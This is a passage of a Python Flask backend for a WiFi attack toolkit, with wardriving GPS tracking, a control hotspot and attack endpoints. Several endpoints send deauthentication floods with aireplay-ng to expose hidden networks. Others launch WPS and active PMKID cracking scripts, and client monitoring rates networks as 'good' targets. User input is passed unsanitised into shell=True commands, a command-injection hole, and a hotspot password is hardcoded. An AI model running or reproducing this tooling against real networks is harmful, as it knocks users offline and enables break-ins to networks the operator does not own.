            'elapsed': int(time.time() - session.start_time)
        }
        wardrive_live_state['session'] = None
        wardrive_live_state['running'] = False

        # Restart the server's GPS reader for status polling
        _start_gps_reader()

        # Trigger map regeneration in background
        def regen_map():
            try:
                subprocess.run(
                    ['python3', 'wardrive_mapper.py', '--regen'],
                    cwd='/home/ov3rr1d3/wifi_arsenal/wardrive_system/wardrive',
                    capture_output=True, timeout=300
                )
            except Exception as e:
                print(f"Map regen error: {e}")
        threading.Thread(target=regen_map, daemon=True).start()

        return jsonify(result)
    except Exception as e:
        wardrive_live_state['running'] = False
        wardrive_live_state['session'] = None
        return jsonify({'success': False, 'error': str(e)})


# Persistent GPS reader thread — keeps serial port open so u-blox doesn't reset
import threading

_gps_state = {
    'connected': False, 'fix': False, 'satellites': 0,
    'latitude': 0.0, 'longitude': 0.0, 'speed': 0.0,
    'hdop': 0.0, 'heading': 0.0,
    'reader_running': False
}
_gps_lock = threading.Lock()

def _find_gps_device():
    """Find the u-blox GPS serial device"""
    import glob
    for dev in sorted(glob.glob('/dev/ttyACM*')):
        try:
            import serial
            ser = serial.Serial(dev, 9600, timeout=2)
            line = ser.readline().decode('ascii', errors='ignore')
            ser.close()
            if '$G' in line:  # NMEA sentence
                return dev
        except Exception:
            continue
    return None

def _gps_reader_thread():
    """Background thread that continuously reads GPS NMEA data"""
    import serial
    import time
    while _gps_state['reader_running']:
        dev = _find_gps_device()
        if not dev:
            with _gps_lock:
                _gps_state['connected'] = False
                _gps_state['fix'] = False
                _gps_state['satellites'] = 0
            time.sleep(3)
            continue
        try:
            ser = serial.Serial(dev, 9600, timeout=2)
            with _gps_lock:
                _gps_state['connected'] = True
            while _gps_state['reader_running']:
                line = ser.readline().decode('ascii', errors='ignore').strip()
                if not line:
                    continue
                if line.startswith('$GNGGA') or line.startswith('$GPGGA'):
                    parts = line.split(',')
                    if len(parts) >= 9:
                        with _gps_lock:
                            fix_quality = int(parts[6]) if parts[6] else 0
                            _gps_state['satellites'] = int(parts[7]) if parts[7] else 0
                            _gps_state['hdop'] = float(parts[8]) if parts[8] else 0.0
                            if fix_quality > 0 and parts[2] and parts[4]:
                                _gps_state['fix'] = True
                                raw_lat = float(parts[2])
                                _gps_state['latitude'] = int(raw_lat / 100) + (raw_lat % 100) / 60.0
                                if parts[3] == 'S':
                                    _gps_state['latitude'] = -_gps_state['latitude']
                                raw_lon = float(parts[4])
                                _gps_state['longitude'] = int(raw_lon / 100) + (raw_lon % 100) / 60.0
                                if parts[5] == 'W':
                                    _gps_state['longitude'] = -_gps_state['longitude']
                            else:
                                _gps_state['fix'] = False
                elif line.startswith('$GNRMC') or line.startswith('$GPRMC'):
                    parts = line.split(',')
                    if len(parts) >= 9:
                        try:
                            with _gps_lock:
                                if parts[7]:
                                    _gps_state['speed'] = float(parts[7]) * 1.151  # knots to mph
                                if parts[8]:
                                    _gps_state['heading'] = float(parts[8])
                        except ValueError:
                            pass
            ser.close()
        except Exception:
            with _gps_lock:
                _gps_state['connected'] = False
                _gps_state['fix'] = False
                _gps_state['satellites'] = 0
            import time
            time.sleep(2)  # Retry after 2 seconds

def _start_gps_reader():
    if not _gps_state['reader_running']:
        _gps_state['reader_running'] = True
        t = threading.Thread(target=_gps_reader_thread, daemon=True)
        t.start()

def _stop_gps_reader():
    _gps_state['reader_running'] = False

@app.route('/api/wardrive/live/gps', methods=['GET'])
def wardrive_live_gps():
    """Get current GPS status — from live session if scanning, otherwise persistent reader"""
    if wardrive_live_state['running'] and wardrive_live_state['session']:
        # Pull from the session's GPS reader
        session = wardrive_live_state['session']
        pos = session.gps.get_position()
        return jsonify({
            'connected': True,
            'fix': pos.get('valid', False),
            'satellites': pos.get('satellites', 0),
            'latitude': pos.get('latitude', 0.0),
            'longitude': pos.get('longitude', 0.0),
            'speed': pos.get('speed_mph', 0.0),
            'heading': pos.get('heading', 0.0),
            'hdop': pos.get('hdop', 0.0),
            'reader_running': True
        })
    # No scan running — use persistent reader
    _start_gps_reader()
    with _gps_lock:
        return jsonify(dict(_gps_state))

@app.route('/api/wardrive/live/status', methods=['GET'])
def wardrive_live_status():
    """Get current live wardrive status"""
    global wardrive_live_state

    if not wardrive_live_state['running'] or not wardrive_live_state['session']:
        return jsonify({'running': False, 'nav_mode': wardrive_live_state['nav_mode']})

    status = wardrive_live_state['session'].get_status()
    status['nav_mode'] = wardrive_live_state['nav_mode']
    return jsonify(status)


@app.route('/api/wardrive/live/stream', methods=['GET'])
def wardrive_live_stream():
    """SSE endpoint for real-time wardrive updates"""
    global wardrive_live_state

    def generate():
        import json as json_module
        while wardrive_live_state['running'] and wardrive_live_state['session']:
            session = wardrive_live_state['session']
            try:
                event = session.event_queue.get(timeout=1)
                yield f"data: {json_module.dumps(event)}\n\n"
            except queue.Empty:
                # Heartbeat to keep connection alive
                yield f"data: {json_module.dumps({'type': 'heartbeat'})}\n\n"
        yield f"data: {json_module.dumps({'type': 'stopped'})}\n\n"

    return Response(
        stream_with_context(generate()),
        mimetype='text/event-stream',
        headers={
            'Cache-Control': 'no-cache',
            'X-Accel-Buffering': 'no'
        }
    )


@app.route('/api/wardrive/live/nav', methods=['POST'])
def wardrive_live_nav():
    """Set nav mode state (synced across all clients)"""
    global wardrive_live_state
    data = request.get_json() or {}
    wardrive_live_state['nav_mode'] = bool(data.get('enabled', False))
    return jsonify({'success': True, 'nav_mode': wardrive_live_state['nav_mode']})


# ========== END WARDRIVING ENDPOINTS ==========


# ========== HOTSPOT ENDPOINTS ==========

@app.route('/api/hotspot/status', methods=['GET'])
def hotspot_status():
    """Check if the Arsenal hotspot is active"""
    try:
        result = subprocess.run(['nmcli', '-t', '-f', 'NAME,DEVICE', 'connection', 'show', '--active'],
                              capture_output=True, text=True, timeout=5)
        active = any('Hotspot' in line and 'wlan0' in line for line in result.stdout.strip().split('\n'))

        info = {'active': active}

        if active:
            info['ssid'] = 'Arsenal-Control'
            # Get IP address
            ip_result = subprocess.run(['nmcli', '-t', '-f', 'IP4.ADDRESS', 'device', 'show', 'wlan0'],
                                      capture_output=True, text=True, timeout=5)
            ip = '10.42.0.1'
            for line in ip_result.stdout.split('\n'):
                if 'IP4.ADDRESS' in line:
                    val = line.split(':', 1)[-1].strip().split('/')[0]
                    if val:
                        ip = val
                    break
            info['ip'] = ip
            info['url'] = 'http://' + ip + ':5000'

            # Connected clients via ARP
            clients = 0
            try:
                arp_result = subprocess.run(['arp', '-n'],
                                          capture_output=True, text=True, timeout=5)
                for line in arp_result.stdout.split('\n')[1:]:
                    parts = line.split()
                    if len(parts) >= 5 and parts[4] == 'wlan0':
                        clients += 1
            except:
                pass
            info['clients'] = clients

        return jsonify(info)
    except Exception as e:
        return jsonify({'active': False, 'error': str(e)})


@app.route('/api/hotspot/start', methods=['POST'])
def hotspot_start():
    """Start the Arsenal WiFi hotspot on wlan0"""
    try:
        # Check if already active
        check = subprocess.run(['nmcli', '-t', '-f', 'NAME,DEVICE', 'connection', 'show', '--active'],
                              capture_output=True, text=True, timeout=5)
        if any('Hotspot' in line and 'wlan0' in line for line in check.stdout.split('\n')):
            return jsonify({'success': True, 'message': 'Hotspot already running',
                          'ssid': 'Arsenal-Control', 'password': 'ars3nal!',
                          'ip': '10.42.0.1', 'url': 'http://10.42.0.1:5000'})

        # Start hotspot — 2.4GHz for phone compatibility and range
        result = subprocess.run([
            'nmcli', 'device', 'wifi', 'hotspot',
            'ifname', 'wlan0',
            'ssid', 'Arsenal-Control',
            'password', 'ars3nal!',
            'band', 'bg'
        ], capture_output=True, text=True, timeout=15)

        if result.returncode == 0:
            time.sleep(2)  # Wait for IP assignment
            ip_result = subprocess.run(['nmcli', '-t', '-f', 'IP4.ADDRESS', 'device', 'show', 'wlan0'],
                                      capture_output=True, text=True, timeout=5)
            ip = '10.42.0.1'
            for line in ip_result.stdout.split('\n'):
                if 'IP4.ADDRESS' in line:
                    val = line.split(':', 1)[-1].strip().split('/')[0]
                    if val:
                        ip = val
                    break

            return jsonify({
                'success': True,
                'ssid': 'Arsenal-Control',
                'password': 'ars3nal!',
                'ip': ip,
                'url': 'http://' + ip + ':5000',
                'mobile_url': 'http://' + ip + ':5000/mobile.html'
            })
        else:
            return jsonify({'success': False, 'error': result.stderr.strip() or 'Failed to start hotspot'})

    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@app.route('/api/hotspot/stop', methods=['POST'])
def hotspot_stop():
    """Stop the Arsenal WiFi hotspot and reconnect to previous network"""
    try:
        result = subprocess.run(['nmcli', 'connection', 'down', 'Hotspot'],
                              capture_output=True, text=True, timeout=10)
        if result.returncode != 0 and 'not an active connection' not in result.stderr:
            return jsonify({'success': False, 'error': result.stderr.strip()})

        return jsonify({'success': True, 'message': 'Hotspot stopped'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# ========== END HOTSPOT ENDPOINTS ==========


@app.route('/api/wardrive/waypoints', methods=['GET'])
def get_waypoints():
    """Get all field waypoints"""
    import sqlite3
    db_path = '/home/ov3rr1d3/wifi_arsenal/wardrive_system/wardrive/wardrive_data.db'
    try:
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
        cursor.execute('CREATE TABLE IF NOT EXISTS field_waypoints (id INTEGER PRIMARY KEY AUTOINCREMENT, latitude REAL NOT NULL, longitude REAL NOT NULL, category TEXT NOT NULL, note TEXT DEFAULT \'\', created_at TEXT NOT NULL)')
        cursor.execute('SELECT id, latitude, longitude, category, note, created_at FROM field_waypoints ORDER BY created_at DESC')
        rows = cursor.fetchall()
        conn.close()
        return jsonify([{'id': r[0], 'latitude': r[1], 'longitude': r[2], 'category': r[3], 'note': r[4], 'created_at': r[5]} for r in rows])
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/wardrive/waypoint', methods=['POST'])
def create_waypoint():
    """Drop a field waypoint at current GPS position"""
    import sqlite3
    db_path = '/home/ov3rr1d3/wifi_arsenal/wardrive_system/wardrive/wardrive_data.db'
    data = request.json or {}
    lat = data.get('latitude')
    lon = data.get('longitude')
    category = data.get('category', 'note')
    note = data.get('note', '')
    if not lat or not lon:
        return jsonify({'error': 'latitude and longitude required'}), 400
    try:
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
        cursor.execute('CREATE TABLE IF NOT EXISTS field_waypoints (id INTEGER PRIMARY KEY AUTOINCREMENT, latitude REAL NOT NULL, longitude REAL NOT NULL, category TEXT NOT NULL, note TEXT DEFAULT \'\', created_at TEXT NOT NULL)')
        now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        cursor.execute('INSERT INTO field_waypoints (latitude, longitude, category, note, created_at) VALUES (?, ?, ?, ?, ?)',
                      (lat, lon, category, note, now))
        conn.commit()
        wid = cursor.lastrowid
        conn.close()
        return jsonify({'success': True, 'id': wid, 'created_at': now})
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/wardrive/waypoint/<int:waypoint_id>', methods=['DELETE'])
def delete_waypoint(waypoint_id):
    """Delete a field waypoint"""
    import sqlite3
    db_path = '/home/ov3rr1d3/wifi_arsenal/wardrive_system/wardrive/wardrive_data.db'
    try:
        conn = sqlite3.connect(db_path)
        conn.execute('DELETE FROM field_waypoints WHERE id = ?', (waypoint_id,))
        conn.commit()
        conn.close()
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/system/battery', methods=['GET'])
def system_battery():
    """Get laptop battery level and charging status"""
    info = {'percent': -1, 'status': 'Unknown', 'plugged_in': False}
    try:
        with open('/sys/class/power_supply/BAT1/capacity') as f:
            info['percent'] = int(f.read().strip())
        with open('/sys/class/power_supply/BAT1/status') as f:
            info['status'] = f.read().strip()
        with open('/sys/class/power_supply/ADP1/online') as f:
            info['plugged_in'] = f.read().strip() == '1'
    except:
        pass
    return jsonify(info)


@app.route('/api/reveal_hidden', methods=['POST'])
def reveal_hidden():
    """Capture probe requests to reveal hidden SSIDs"""
    data = request.json or {}
    target_bssid = data.get('bssid')  # Optional: specific target to deauth
    target_channel = data.get('channel')
    
    try:
        duration = 60
        timestamp = time.strftime('%Y%m%d_%H%M%S')
        output_prefix = os.path.join(CAPTURE_DIR, f'reveal_{timestamp}')
        
        # Run airodump-ng to capture probe requests
        result = run_script('mode_manager.sh', ['ensure', 'alfa0', 'monitor'], timeout_seconds=10)
        if not result['success']:
            return jsonify({'success': False, 'output': 'Failed to set monitor mode'})
        
        # If target specified, deauth it to force reconnection
        if target_bssid and target_channel:
            # Validate channel
            try:
                channel_num = int(target_channel)
                if channel_num < 1 or channel_num > 165:
                    return jsonify({
                        'success': False,
                        'output': f'Invalid channel: {target_channel}\n\nChannel must be 1-165. This network has an invalid/unknown channel.\nTry passive "Reveal Hidden SSIDs" instead.'
                    })
            except ValueError:
                return jsonify({
                    'success': False,
                    'output': f'Invalid channel: {target_channel}\n\nCannot deauth without valid channel.'
                })
            
            # Start monitoring in background
            cmd = f'sudo airodump-ng -w {output_prefix} --output-format csv alfa0'
            monitor_proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Wait 2 seconds for airodump to initialize
            time.sleep(2)
            
            # Set channel
            subprocess.run(f'sudo iw dev alfa0 set channel {target_channel}', shell=True, capture_output=True)
            
            # Send deauth packets
            subprocess.run(f'sudo aireplay-ng -0 5 -a {target_bssid} alfa0', shell=True, capture_output=True, timeout=10)
            
            # Continue monitoring for remaining time
            time.sleep(duration - 12)  # Account for setup time
            
            # Stop monitoring
            monitor_proc.terminate()
            monitor_proc.wait(timeout=5)
        else:
            # Passive monitoring only
            cmd = f'sudo timeout {duration} airodump-ng -w {output_prefix} --output-format csv alfa0'
            subprocess.run(cmd, shell=True, capture_output=True)
        
        csv_file = f'{output_prefix}-01.csv'
        if not os.path.exists(csv_file):
            return jsonify({'success': False, 'output': 'Capture failed - no CSV created'})
        
        # Parse probe requests from station section
        hidden_mappings = {}
        
        with open(csv_file, 'r', errors='ignore') as f:
            lines = f.readlines()
        
        station_section = False
        for line in lines:
            if 'Station MAC' in line:
                station_section = True
                continue
            
            if station_section and line.strip():
                parts = line.split(',')
                if len(parts) >= 7:
                    bssid = parts[5].strip()  # BSSID being probed
                    probe_ssid = parts[6].strip()  # Probe SSID
                    
                    if bssid and probe_ssid and ':' in bssid:
                        hidden_mappings[bssid] = probe_ssid
        
        # Load existing cache
        existing_cache = {}
        if os.path.exists(HIDDEN_CACHE):
            try:
                with open(HIDDEN_CACHE, 'r') as f:
                    existing_cache = json.load(f)
            except:
                pass
        
        # Merge new discoveries
        existing_cache.update(hidden_mappings)
        
        # Save cache
        with open(HIDDEN_CACHE, 'w') as f:
            json.dump(existing_cache, f, indent=2)
        
        # Cleanup CSV
        os.remove(csv_file)
        
        if hidden_mappings:
            output = f'Revealed {len(hidden_mappings)} hidden SSID(s):\n\n'
            for bssid, ssid in hidden_mappings.items():
                output += f'{bssid} → {ssid}\n'
            output += '\nCache updated. These will auto-populate in future scans.'
        else:
            output = 'No hidden SSIDs revealed.\n\nEither no clients connected during monitoring,\nor all networks broadcast their SSIDs.'
        
        return jsonify({
            'success': True,
            'output': output,
            'revealed_count': len(hidden_mappings)
        })
    
    except Exception as e:
        return jsonify({
            'success': False,
            'output': f'Error: {str(e)}'
        })

@app.route('/api/reveal_hidden_batch', methods=['POST'])
def reveal_hidden_batch():
    """Batch reveal multiple hidden SSIDs by deauthing all targets"""
    data = request.json or {}
    targets = data.get('targets', [])  # List of {bssid, channel}
    
    if not targets:
        return jsonify({'success': False, 'output': 'No targets provided'})
    
    # Filter valid targets (must have valid channel)
    valid_targets = []
    for target in targets:
        bssid = target.get('bssid')
        channel = target.get('channel')
        
        try:
            channel_num = int(channel)
            if 1 <= channel_num <= 165 and bssid:
                valid_targets.append({'bssid': bssid, 'channel': channel_num})
        except:
            continue
    
    if not valid_targets:
        return jsonify({
            'success': False,
            'output': 'No valid targets found.\n\nAll hidden networks have invalid channels.'
        })
    
    monitor_proc = None
    try:
        duration = 90  # Longer for multiple networks
        timestamp = time.strftime('%Y%m%d_%H%M%S')
        output_prefix = os.path.join(CAPTURE_DIR, f'reveal_batch_{timestamp}')

        # Set monitor mode
        result = run_script('mode_manager.sh', ['ensure', 'alfa0', 'monitor'], timeout_seconds=10)
        if not result['success']:
            return jsonify({'success': False, 'output': 'Failed to set monitor mode'})

        # Start monitoring in background
        cmd = f'sudo airodump-ng -w {output_prefix} --output-format csv alfa0'
        monitor_proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Wait for airodump to initialize
        time.sleep(2)
        
        # Deauth each target sequentially
        for i, target in enumerate(valid_targets, 1):
            bssid = target['bssid']
            channel = target['channel']
            
            # Set channel
            subprocess.run(f'sudo iw dev alfa0 set channel {channel}', shell=True, capture_output=True)
            
            # Send deauth
            subprocess.run(f'sudo aireplay-ng -0 5 -a {bssid} alfa0', shell=True, capture_output=True, timeout=10)
            
            # Small delay between targets
            time.sleep(3)
        
        # Continue monitoring for remaining time
        remaining = duration - (len(valid_targets) * 13)  # ~13s per target (channel switch + deauth + delay)
        if remaining > 0:
            time.sleep(remaining)
        
        # Stop monitoring
        monitor_proc.terminate()
        monitor_proc.wait(timeout=5)
        
        csv_file = f'{output_prefix}-01.csv'
        if not os.path.exists(csv_file):
            return jsonify({'success': False, 'output': 'Capture failed - no CSV created'})
        
        # Parse probe requests
        hidden_mappings = {}
        
        with open(csv_file, 'r', errors='ignore') as f:
            lines = f.readlines()
        
        station_section = False
        for line in lines:
            if 'Station MAC' in line:
                station_section = True
                continue
            
            if station_section and line.strip():
                parts = line.split(',')
                if len(parts) >= 7:
                    bssid = parts[5].strip()
                    probe_ssid = parts[6].strip()
                    
                    if bssid and probe_ssid and ':' in bssid:
                        hidden_mappings[bssid] = probe_ssid
        
        # Load and update cache
        existing_cache = {}
        if os.path.exists(HIDDEN_CACHE):
            try:
                with open(HIDDEN_CACHE, 'r') as f:
                    existing_cache = json.load(f)
            except:
                pass
        
        existing_cache.update(hidden_mappings)
        
        with open(HIDDEN_CACHE, 'w') as f:
            json.dump(existing_cache, f, indent=2)
        
        # Cleanup
        os.remove(csv_file)
        
        if hidden_mappings:
            output = f'Batch reveal complete!\n\nRevealed {len(hidden_mappings)} of {len(valid_targets)} hidden networks:\n\n'
            for bssid, ssid in hidden_mappings.items():
                output += f'{bssid} → {ssid}\n'
            output += '\n✓ Run "Scan Networks" again to see revealed names.'
        else:
            output = f'Batch reveal complete.\n\nNo SSIDs revealed from {len(valid_targets)} attempts.\n\nNo clients connected during monitoring.'
        
        return jsonify({
            'success': True,
            'output': output,
            'revealed_count': len(hidden_mappings),
            'attempted_count': len(valid_targets)
        })
    
    except Exception as e:
        return jsonify({
            'success': False,
            'output': f'Error: {str(e)}'
        })
    finally:
        # Always cleanup monitor process
        if monitor_proc:
            try:
                monitor_proc.terminate()
                monitor_proc.wait(timeout=5)
            except:
                monitor_proc.kill()


@app.route('/api/monitor_clients', methods=['POST'])
def monitor_clients():
    """Monitor target network for connected clients"""
    data = request.json
    bssid = data.get('bssid')
    channel = str(data.get('channel'))
    ssid = data.get('ssid', 'unknown')
    duration = int(data.get('duration', 30))
    
    if not bssid or not channel:
        return jsonify({'success': False, 'output': 'Missing BSSID or channel'})
    
    try:
        timestamp = time.strftime('%Y%m%d_%H%M%S')
        output_prefix = os.path.join(CAPTURE_DIR, f'client_monitor_{timestamp}')
        
        # Ensure monitor mode
        result = run_script('mode_manager.sh', ['ensure', 'alfa0', 'monitor'], timeout_seconds=10)
        if not result['success']:
            return jsonify({'success': False, 'output': 'Failed to set monitor mode'})
        
        # Run airodump-ng focused on target channel
        cmd = f'sudo timeout {duration} airodump-ng --bssid {bssid} -c {channel} -w {output_prefix} --output-format csv alfa0'
        try:
            subprocess.run(cmd, shell=True, capture_output=True, timeout=duration + 5)
        except subprocess.TimeoutExpired:
            # Kill any hanging airodump processes
            subprocess.run('sudo pkill -9 airodump-ng', shell=True, capture_output=True)
        
        csv_file = f'{output_prefix}-01.csv'
        if not os.path.exists(csv_file):
            return jsonify({
                'success': False,
                'output': 'Monitoring failed - no capture file created'
            })
        
        # Parse clients from station section
        clients = []
        
        with open(csv_file, 'r', errors='ignore') as f:
            lines = f.readlines()
        
        station_section = False
        for line in lines:
            if 'Station MAC' in line:
                station_section = True
                continue
            
            if station_section and line.strip():
                parts = line.split(',')
                if len(parts) >= 7:
                    client_mac = parts[0].strip()
                    connected_bssid = parts[5].strip()
                    
                    # Only include clients connected to our target
                    if connected_bssid.upper() == bssid.upper() and ':' in client_mac:
                        power = parts[3].strip() if len(parts) > 3 else 'N/A'
                        packets = parts[4].strip() if len(parts) > 4 else '0'
                        probe = parts[6].strip() if len(parts) > 6 else ''
                        
                        clients.append({
                            'mac': client_mac,
                            'power': power,
                            'packets': packets,
                            'probe': probe
                        })
        
        # Remove duplicates (same MAC)
        unique_clients = {}
        for client in clients:
            mac = client['mac']
            if mac not in unique_clients:
                unique_clients[mac] = client
        
        clients = list(unique_clients.values())
        
        # Cleanup CSV
        try:
            os.remove(csv_file)
        except:
            pass
        
        # Build output message
        if clients:
            output = f'✅ Found {len(clients)} client(s) connected to {ssid}:\n\n'
            for i, client in enumerate(clients, 1):
                output += f'{i}. {client["mac"]} (Signal: {client["power"]} dBm, {client["packets"]} packets)'
                if client['probe']:
                    output += f' [Probing: {client["probe"]}]'
                output += '\n'
            output += '\n✓ Network has active clients - good target for handshake capture!'
        else:
            output = f'❌ No clients detected on {ssid}\n\nEither no devices are connected, or they\'re not transmitting during monitoring.\n\nThis network is a poor target right now - try:\n• Attacking during peak hours (morning/evening)\n• Choosing a different network with clients\n• Waiting and monitoring again later'
        
        return jsonify({
            'success': True,
            'output': output,
            'client_count': len(clients),
            'clients': clients
        })
    
    except Exception as e:
        return jsonify({
            'success': False,
            'output': f'Error monitoring clients: {str(e)}'
        })


@app.route('/api/mode/status', methods=['GET'])
def mode_status():
    """Get current mode of both cards"""
    try:
        alfa0_result = subprocess.run(
            ['bash', os.path.join(SCRIPT_DIR, 'mode_manager.sh'), 'status', 'alfa0'],
            capture_output=True,
            text=True,
            timeout=5
        )
        
        alfa1_result = subprocess.run(
            ['bash', os.path.join(SCRIPT_DIR, 'mode_manager.sh'), 'status', 'alfa1'],
            capture_output=True,
            text=True,
            timeout=5
        )
        
        return jsonify({
            'alfa0': alfa0_result.stdout.strip(),
            'alfa1': alfa1_result.stdout.strip()
        })
    except Exception as e:
        return jsonify({
            'alfa0': 'error',
            'alfa1': 'error',
            'error': str(e)
        })

@app.route('/api/mode/set', methods=['POST'])
def mode_set():
    """Manually set card mode"""
    data = request.json
    interface = data.get('interface')
    mode = data.get('mode')
    
    if not interface or not mode:
        return jsonify({
            'success': False,
            'output': 'Missing interface or mode'
        })
    
    if interface not in ['alfa0', 'alfa1']:
        return jsonify({
            'success': False,
            'output': 'Invalid interface. Must be alfa0 or alfa1'
        })
    
    if mode not in ['monitor', 'managed']:
        return jsonify({
            'success': False,
            'output': 'Invalid mode. Must be monitor or managed'
        })
    
    result = run_script('mode_manager.sh', ['set', interface, mode], timeout_seconds=10)
    
    return jsonify({
        'success': result['success'],
        'output': result['output']
    })

# ========== LIVE ATTACK STREAMING ==========

@app.route('/api/attack/start_wps', methods=['POST'])
def start_wps_live():
    """Start WPS attack with live streaming"""
    global live_attack
    
    if live_attack['running']:
        return jsonify({'success': False, 'output': 'Another attack is already running'})
    
    data = request.json
    bssid = data.get('bssid')
    channel = str(data.get('channel'))
    ssid = data.get('ssid', 'unknown')
    
    if not bssid or not channel:
        return jsonify({'success': False, 'output': 'Missing BSSID or channel'})
    
    timestamp = time.strftime('%Y%m%d_%H%M%S')
    log_file = os.path.join(ATTACK_LOG_DIR, f'wps_live_{timestamp}.log')
    
    # Start attack in background
    script_path = os.path.join(SCRIPT_DIR, 'attack_wps.sh')
    cmd = f'bash {script_path} {bssid} {channel} "{ssid}" 2>&1 | tee {log_file}'
    
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                           preexec_fn=os.setsid)
    
    live_attack['running'] = True
    live_attack['log_file'] = log_file
    live_attack['attack_type'] = 'WPS'
    live_attack['target'] = ssid
    live_attack['start_time'] = time.time()
    live_attack['pid'] = proc.pid
    
    # Start thread to monitor completion
    def monitor_attack():
        proc.wait()
        live_attack['running'] = False
    
    thread = threading.Thread(target=monitor_attack)
    thread.daemon = True
    thread.start()
    
    return jsonify({'success': True, 'output': 'WPS attack started', 'log_file': log_file})

@app.route('/api/attack/start_pmkid_active', methods=['POST'])
def start_pmkid_active_live():
    """Start Active PMKID attack with live streaming"""
    global live_attack
    
    if live_attack['running']:
        return jsonify({'success': False, 'error': 'Another attack is already running'})
    
    data = request.json
    bssid = data.get('bssid')
    channel = str(data.get('channel'))
    ssid = data.get('ssid', 'unknown')
    duration = str(data.get('duration', 120))
    
    if not bssid or not channel:
        return jsonify({'success': False, 'error': 'Missing BSSID or channel'})
    
    timestamp = time.strftime('%Y%m%d_%H%M%S')
    log_file = os.path.join(ATTACK_LOG_DIR, f'pmkid_active_live_{timestamp}.log')
    
    # Start attack in background
    script_path = os.path.join(SCRIPT_DIR, 'capture_pmkid_active.sh')
    cmd = f'bash {script_path} {bssid} {channel} "{ssid}" {duration} 2>&1 | tee {log_file}'
    
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                           preexec_fn=os.setsid)
    
    live_attack['running'] = True
    live_attack['log_file'] = log_file
    live_attack['attack_type'] = 'PMKID_ACTIVE'
    live_attack['target'] = ssid
    live_attack['start_time'] = time.time()
    live_attack['pid'] = proc.pid
    
    # Start thread to monitor completion
    def monitor_attack():
        proc.wait()
        live_attack['running'] = False
    
    thread = threading.Thread(target=monitor_attack)
    thread.daemon = True
    thread.start()
    
    return jsonify({'success': True, 'output': 'Active PMKID capture started', 'log_file': log_file})




@app.route('/api/attack/output', methods=['GET'])
def get_attack_output():
    """Get current output from live attack"""
    global live_attack
    
    result = {
        'running': live_attack['running'],
        'attack_type': live_attack.get('attack_type'),
        'target': live_attack.get('target'),
        'output': ''
    }
    
    if live_attack.get('log_file') and os.path.exists(live_attack['log_file']):
        try:
            with open(live_attack['log_file'], 'r') as f:
                result['output'] = f.read()
        except:
            pass
    
    # Check elapsed time
    if live_attack.get('start_time'):
        result['elapsed'] = int(time.time() - live_attack['start_time'])
    
    return jsonify(result)


@app.route('/api/attack/stop', methods=['POST'])
def stop_attack():
    """Stop current live attack"""
    global live_attack
    
    if live_attack.get('pid'):
        try:
            os.killpg(os.getpgid(live_attack['pid']), signal.SIGTERM)
        except:
            pass
    
    live_attack['running'] = False
    live_attack['pid'] = None
    
    return jsonify({'success': True, 'output': 'Attack stopped'})


@app.route('/api/kill_all', methods=['POST'])
def kill_all():
    """EMERGENCY: Kill ALL network operations immediately"""
    global live_attack, orchestrator_state
    
    killed = []
    
    # Kill all WiFi attack/scan processes
    processes_to_kill = [
        'airodump-ng',
        'aireplay-ng', 
        'hcxdumptool',
        'reaver',
        'bully',
        'hostapd',
        'dnsmasq',
        'wifite',
        'wash'
    ]
    
    for proc in processes_to_kill:
        result = subprocess.run(['pkill', '-9', proc], capture_output=True)
        if result.returncode == 0:
            killed.append(proc)
    
    # Reset tracking state
    live_attack['running'] = False
    live_attack['pid'] = None
    orchestrator_state['running'] = False
    
    if killed:
        output = f"Killed: {', '.join(killed)}"
    else:
        output = "No active processes found"
    
    return jsonify({'success': True, 'output': output})


@app.route('/api/stop_current', methods=['POST'])
def stop_current():
    """Smart stop - kills whatever is currently running"""
    global live_attack, orchestrator_state
    
    killed = []
    
    # Try to stop tracked live attack first
    if live_attack.get('pid'):
        try:
            os.killpg(os.getpgid(live_attack['pid']), signal.SIGTERM)
            killed.append('live attack (tracked)')
        except:
            pass
        live_attack['running'] = False
        live_attack['pid'] = None
    
    # Stop orchestrator if running
    if orchestrator_state.get('running'):
        orchestrator_state['running'] = False
        killed.append('orchestrator')
    
    # Kill common attack processes that might be running
    for proc in ['airodump-ng', 'aireplay-ng', 'hcxdumptool', 'reaver', 'bully']:
        result = subprocess.run(['pkill', '-9', proc], capture_output=True)
        if result.returncode == 0:
            killed.append(proc)
    
    if killed:
        output = f"Stopped: {', '.join(killed)}"
    else:
        output = "Nothing was running"
    
    return jsonify({'success': True, 'output': output})


# ========== TARGET INTELLIGENCE BRIEF ==========

@app.route('/api/target_data/<bssid>', methods=['GET'])
def get_target_data(bssid):
    """Get notes and attack history for a target"""
    data = load_target_data()
    bssid = bssid.upper()
    if bssid in data:
        return jsonify(data[bssid])
    return jsonify({'ssid': '', 'notes': '', 'attacks': []})


@app.route('/api/target_data/note', methods=['POST'])
def set_target_note():
    """Save note for a target"""
    req = request.json or {}
    bssid = req.get('bssid', '').upper()
    ssid = req.get('ssid', '')
    note = req.get('note', '')
    
    if not bssid:
        return jsonify({'success': False, 'error': 'BSSID required'})
    
    data = load_target_data()
    if bssid not in data:
        data[bssid] = {'ssid': ssid, 'notes': '', 'attacks': []}
    
    data[bssid]['notes'] = note
    if ssid:
        data[bssid]['ssid'] = ssid
    save_target_data(data)
    
    return jsonify({'success': True})


@app.route('/api/target_data/all', methods=['GET'])
def get_all_target_data():
    """Get all target data (for indicators in network list)"""
    return jsonify(load_target_data())


@app.route('/api/target_intel', methods=['POST'])
def target_intel():
    """Full Target Intelligence Brief - rich monitoring data for The Operator"""
    data = request.json
    bssid = data.get('bssid')
    channel = str(data.get('channel'))
    ssid = data.get('ssid', 'unknown')
    duration = int(data.get('duration', 30))
    
    if not bssid or not channel:
